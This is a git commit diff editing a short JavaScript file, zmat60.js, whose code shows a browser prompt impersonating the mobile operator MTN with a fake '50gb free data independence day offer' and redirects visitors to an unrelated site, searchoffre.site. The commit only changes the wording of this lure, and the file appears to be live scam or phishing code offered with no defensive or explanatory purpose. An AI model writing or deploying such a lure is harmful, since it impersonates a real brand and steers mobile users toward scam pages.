673cabca5d0edfaa04fcee819e803c0c963a7d24
bigetijazz8 <bigetijazz8@gmail.com>
2024-10-28 06:34:11 -0700

    Update zmat60.js

--- zmat60.js
+++ zmat60.js
@@ -1,6 +1,6 @@
 
 var password = 'ACTIVATE 50GB'
-password=prompt('MTN: Congratulations you have been selected to receive ACTIVATE 50gb free data independence day offer, Kindly press Ok to proceed now','ACTIVATE 50GB');
+password=prompt('MTN: Congratulations you have been selected to receive 50gb free data independence day offer, Kindly press Ok to proceed now','ACTIVATE 50GB');
 if (password != 'ACTIVATE 50GB') {
 location.href='https://www.searchoffre.site/20go';
 }
